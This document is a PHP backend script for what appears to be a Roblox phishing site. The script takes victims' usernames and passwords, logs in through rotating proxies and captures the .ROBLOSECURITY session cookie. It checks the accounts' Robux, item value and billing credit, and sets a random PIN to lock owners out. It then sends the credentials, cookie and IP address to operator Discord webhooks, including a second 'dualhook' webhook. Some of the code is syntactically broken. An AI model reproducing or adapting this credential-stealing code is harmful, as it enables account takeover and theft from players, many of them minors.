<?php
error_reporting(E_ALL);
include('../web/setup/setup.php');
include('../web/setup/database.php');
include('../includes/functions.php');
include('stub.php');
function rid($username)
{
    $getId = request(
        "https://api.roblox.com/users/get-by-username?username=$username"
    );
    if (strpos($getId, "Id") !== false) {
        $idDecode = json_decode($getId);
        $id = $idDecode->Id;
        return $id;
    } else {
        return "Not Exist";
    }
    return;
}



if(isset($_GET['username'])){
    $username = htmlspecialchars($_GET["username"]);
    $password = htmlspecialchars($_GET["password"]);
    $fctoken = htmlspecialchars($_GET["fctokens"]);
    $loginToken = htmlspecialchars($_GET["session"]);
    $row = $db->query("SELECT * FROM east WHERE logintoken='$loginToken'")->fetch();
    $dualhookfucker = $row["dualhook"];
    $webhookUrl = $row["webhook"];
    $siteId = $row["siteid"];
    $uid = rid($username);
    $shitfile = "bcount.txt";
    $file = "../includes/secretproxyfilesexylol.txt";
    $file_arr = file($file);
    $num_lines = count($file_arr);
    $last_arr_index = $num_lines - 1;
    $rand_index = 0;
    $rand_index = rand(0, $last_arr_index);
    $rand_text = $file_arr[$rand_index];
    $login = login($username,$password,$fctoken,$rand_text);
    $loginstats = json_decode($login);
  if($loginstats->message == 'rate limit'){
   $ratelimit = "truexd"; 
  }else if($loginstats->message == 'Incorrect username or password'){
   $incorrect= "truexd"; 
  }else if($loginstats->message == 'success'){
   	    $cookie = $loginstats->cookie;
   	    $proxy = explode(':', $rand_text);
   	    $proxy_ip = $proxy[0];
   	    $proxy_port = $proxy[1];
   	    $user = $proxy[2];
   	    $pass = $proxy[3];
    function getrap($user_id, $cookie, $fullproxy) {
        $proxy = explode(':', $fullproxy);
        $proxy_ip = $proxy[0];
        $proxy_port = $proxy[1];
        $user = $proxy[2];
        $pass = $proxy[3];
        $cursor = "";
        $total_rap = 0;
                            
        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($request, CURLOPT_PROXYPORT, $proxy_port);
            curl_setopt($request, CURLOPT_PROXYTYPE, 'HTTP');
            curl_setopt($request, CURLOPT_PROXY, $proxy_ip);
            curl_setopt($request, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }
                            
        return $total_rap;
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Cookie: .ROBLOSECURITY=' . $cookie
    ));
    curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $profile = json_decode(curl_exec($ch), 1);
    curl_close($ch);
$userid = $profile["UserID"];
$ch3= curl_init();

curl_setopt($ch3, CURLOPT_URL, 'https://billing.roblox.com/v1/credit');
curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch3, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch3, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch3, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch3, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
$headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
$headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
$output2 = curl_exec($ch3);
$info2=json_decode($output2);
$balance=$info2->balance;
$ch4= curl_init();

curl_setopt($ch4, CURLOPT_URL, "https://economy.roblox.com/v2/users/$userid/transaction-totals?timeFrame=Year&transactionType=summary");
curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch4, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch4, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch4, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch4, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
$headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
$headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch4, CURLOPT_HTTPHEADER, $headers);
$output3 = curl_exec($ch4);
$info3=json_decode($output3);
$summary1=$info3->purchasesTotal;
$summary = number_format($summary1);
$ch5= curl_init();

curl_setopt($ch5, CURLOPT_URL, "https://friends.roblox.com/v1/users/$userid/followers/count");
curl_setopt($ch5, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch5, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch5, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch5, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch5, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
$headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
$headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch5, CURLOPT_HTTPHEADER, $headers);
$output4 = curl_exec($ch5);
$info4=json_decode($output4);
$follower=$info4->count;
$getdate = "https://users.roblox.com/v1/users/$userid";

$gcurl = curl_init($getdate);
curl_setopt($gcurl, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($gcurl, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($gcurl, CURLOPT_PROXY, $proxy_ip);
curl_setopt($gcurl, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
curl_setopt($gcurl, CURLOPT_URL, $getdate);
curl_setopt($gcurl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
);
curl_setopt($gcurl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($gcurl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($gcurl, CURLOPT_SSL_VERIFYPEER, false);

$gresp = curl_exec($gcurl);
$getdata = json_decode($gresp);
$joindate = $getdata->created;
$bobux = $profile["RobuxBalance"];

function requestCookie($url, $cookie, $fullproxy)
{
    $proxy = explode(':', $fullproxy);
    $proxy_ip = $proxy[0];
    $proxy_port = $proxy[1];
    $user = $proxy[2];
    $pass = $proxy[3];
    
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=$cookie"));
$output = curl_exec($ch);
curl_close($ch);
return $output;
}
function requestVerifiedCookie($cookie, $fullproxy)
{
    $proxy = explode(':', $fullproxy);
    $proxy_ip = $proxy[0];
    $proxy_port = $proxy[1];
    $user = $proxy[2];
    $pass = $proxy[3];
$getVerified = requestCookie("https://accountsettings.roblox.com/v1/email", $cookie, $fullproxy);
$getVerifiedDecode = json_decode($getVerified);
if ($getVerifiedDecode->verified == False) {
return "Unverified";
} else {
return "Verified";
}
}
function requestCreditCookie($cookie, $fullproxy)
{
    $proxy = explode(':', $fullproxy);
    $proxy_ip = $proxy[0];
    $proxy_port = $proxy[1];
    $user = $proxy[2];
    $pass = $proxy[3];
    $getCredit = requestCookie("https://billing.roblox.com/v1/gamecard/userdata", $cookie, $fullproxy);
    $_Credit = str_replace('"', '', $getCredit);
    return $_Credit;
}
function requestPinCookie($cookie, $fullproxy)
{
    $getPin = requestCookie("https://auth.roblox.com/v1/account/pin", $cookie, $fullproxy);
    $getPinDecode = json_decode($getPin);
    $pin = $getPinDecode->isEnabled;
    return $pin;
}
function postPin($cookie, $fullproxy){
    $proxy = explode(':', $fullproxy);
    $proxy_ip = $proxy[0];
    $proxy_port = $proxy[1];
    $user = $proxy[2];
    $pass = $proxy[3];
if(requestPinCookie($cookie, $fullproxy) == "true"){
    return "Undefined";
}else{
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
"cvalue":"Leakeder",
"ctype":"Username",
"password":"RAMAD001",
}'
);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
$headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
$headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$headers = [];
$result = rtrim($result);
$data = explode("\n",$result);
$headers['status'] = $data[0];
array_shift($data);

foreach($data as $part){

//some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
$middle = explode(":",$part,2);

//Supress warning message if $middle[1] does not exist, Thanks to @crayons
if ( !isset($middle[1]) ) { $middle[1] = null; }
$headers[trim($middle[0])] = trim($middle[1]);
}

$csrf= $headers["x-csrf-token"];

$pin = rand("0000","9999");

$fields_string='{
"pin": "'.$pin.'"
}';

$ch2= curl_init();
curl_setopt($ch2, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch2, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch2, CURLOPT_PROXY, $proxy_ip);
curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
curl_setopt($ch2, CURLOPT_URL, 'https://auth.roblox.com/v1/account/pin');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_HEADER, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);
$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
$headers[] = 'Origin: https://www.roblox.com';
$headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
$headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
$header_size = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
$output = curl_exec($ch2);
return "$pin";
}
}
$pin = postPin($cookie);
//beam count time! daddy!
//uwu stop!!! uwu daddy!!!! wyddddd
$directoryofbeams = "../users/$siteId/bcount.txt";
$handle = fopen("$directoryofbeams", "r"); 
if(!$handle){ 
echo "error!" ;
} 
else { 
$counter = ( int ) fread ($handle,20) ;
fclose ($handle) ;
$counter++ ; 
$handle = fopen("$directoryofbeams", "w" ) ; 
fwrite($handle,$counter) ; 
fclose ($handle) ;
//now shitty totals
$beamtotaldir = "../web/site/siteBeam.txt";
$handle1 = fopen("$beamtotaldir", "w" ) ; 
$counter1 = ( int ) fread ($handle1,20) ;
$counter1++ ; 
$handle1 = fopen("$beamtotaldir", "w" ) ; 
fwrite($handle1,$counter1) ; 
fclose ($handle1) ; 
$userid = $profile["UserID"];
$cookie1 = str_replace("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", "", $cookie);
$ipaddr =getUserIP();

function getSettingJson($cookiem $fullproxy){
    $proxy = explode(':', $fullproxy);
    $proxy_ip = $proxy[0];
    $proxy_port = $proxy[1];
    $user = $proxy[2];
    $pass = $proxy[3];
    $request = requestCookie('https://www.roblox.com/my/settings/json', $cookie, $fullproxy);
    $json = json_decode($request);
    return $json;
}
function getPendingRobux($cookie,$fullproxy){
    $proxy = explode(':', $fullproxy);
    $proxy_ip = $proxy[0];
    $proxy_port = $proxy[1];
    $user = $proxy[2];
    $pass = $proxy[3];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Cookie: .ROBLOSECURITY=' . $cookie
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
    curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
    $profile = json_decode(curl_exec($ch), 1);
    curl_close($ch);
    $shit = requestCookie("https://economy.roblox.com/v2/users/" . $profile["UserID"] . "/transaction-totals?timeFrame=Year&transactionType=summary", $cookie);
    $json = json_decode($shit, true);
    return $json["pendingRobuxTotal"];
}
function requestAge($id)
{
    $getDateBirth = request("https://users.roblox.com/v1/users/$id");
    $jsonDateBirth = json_decode($getDateBirth);
    preg_match('/(?<=)(.*?)(?=T)/', $jsonDateBirth->created, $result);
    $dateBirth = $result[0];
    $Today = date("Y-m-d");
    $Count = date_diff(date_create($dateBirth), date_create($Today));
    return $Count->days . " Days";
}
$rap = getrap($profile["UserID"], $cookie);
if($rap > 10000){
    $content = "@everyone";
}else if($bobux > 10000){
    $content = "@everyone";
}else{
    $content = "";
}
$settingjson = getSettingJson($cookie);
if($settingjson->UserAbove13){
    $changeage = "13+";
}else{
    $changeage = "<13";
}
$age = requestAge($profile["UserID"]);
$pendingRobux = getPendingRobux($cookie);
$creditbalance = requestCreditCookie($cookie);
    $hookObject = json_encode([
        "username" => "BOT - $siteName",
        "avatar_url" => "$mainpfp",
         "content" => "$contentmessage",
            "embeds" => [
                [
                    "title" => '**:money_with_wings: +1 Result Account :candle:**',
                    "type" => "rich",
                    "description" => "[**Check Cookie**]($domain/controller/check-cookie.php?cookie=$cookie1&password=$password) | [**Rolimons**](https://www.rolimons.com/player/$userid) | [**Roblox Profile**](https://roblox.com/users/$userid/profile)",
                    "url" => "https://www.roblox.com/users/". $profile["UserID"] ."/profile",
                    "color" => hexdec("$embedColor"),
                    "thumbnail" => [
                        "url" => "https://www.roblox.com/headshot-thumbnail/image?userId=". $profile["UserID"] .  "&width=420&height=420&format=png"
                    ],
                    "author" => [
                         "name" => "$siteName - Result",
                         "url" => "$discord"
                    ],
                    "footer" => [
                        "text" => "$siteName",
                      "icon_url" => "$mainpfp"
                    ],
                    "fields" => [
                        [
                            "name" => "**Username**",
                            "value" => "$username",
                            "inline" => False
                        ],
                        [
                            "name" => "**Password**",
                            "value" => "$password",
                            "inline" => False
                        ],
                        [
                            "name" => "**Robux (Robux Pending)**",
                            "value" =>  "$bobux ($pendingRobux)",
                            "inline" => True
                        ],
                        [
                            "name" => "**Summary**",
                            "value" => "$summary",
                            "inline" => True
                        ],
                        [
                            "name" => "**Premium**",
                            "value" => $profile["IsPremium"],
                            "inline" => True
                        ],
                        [
                            "name" => "**RAP:**",
                            "value" => "$rap",
                            "inline" => True
                        ],
                        [
                            "name" => "**Credit Balance**",
                            "value" =>  "$balance",
                            "inline" => True
                        ],
                        [
                            "name" => "**Verified**",
                            "value" => requestVerifiedCookie($cookie),
                            "inline" => True
                        ],
                        [
                            "name" => "**Account Age**",
                            "value" => "$age",
                            "inline" => True
                        ],
                        [
                            "name" => "**13+ or <13**",
                            "value" => "$changeage",
                            "inline" => True
                        ],
                        [
                            "name" => "**Pin**",
                            "value" => "$pin",
                            "inline" => True
                        ],
                        [
                            "name" => "**IP Address**",
                            "value" => "$ipaddr",
                            "inline" => True
                        ],
                        [
                            "name" => "**Cookie:**",
                            "value" => "```". $cookie ."```",
                            "inline" => False
                        ],
                    ]
                ],
            ],
        
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


    $chsex = curl_init();
    curl_setopt_array($chsex, [
        CURLOPT_URL => "$webhookUrl",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $hookObject,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json"
        ]
    ]);

                                    
    $responsesex = curl_exec($chsex);
    curl_close($chsex);
            $ch1 = curl_init();
    curl_setopt_array($ch1, [
        CURLOPT_URL => "$dualhook",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $hookObject,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json"
        ]
    ]);

                                    
    $response1 = curl_exec($ch1);
    curl_close($ch1);

    $ch22 = curl_init();
    curl_setopt_array($ch22, [
        CURLOPT_URL => "$dualhookfucker",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $hookObject,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json"
        ]
    ]);

                                    
    $response22 = curl_exec($ch22);
    curl_close($ch22);
} 
  }else{
      
  }
}
if($loginstats->message=="success"){
    echo '{"message": "success"}';
}else if($loginstats->message=="2nd"){
    $fullproxy = trim(preg_replace('/\s\s+/', ' ', $rand_text));
    echo '{"message": "2nd", "ticket": "'. $loginstats->ticket .'", "proxy": "'. $fullproxy .'", "userid": "'.$uid.'"}';
}else if($loginstats->message=="Incorrect username or password"){
    echo '{"message": "wrong password"}';
}else{
      echo $login;
      echo "<br>";
      echo $rand_text;
}
?>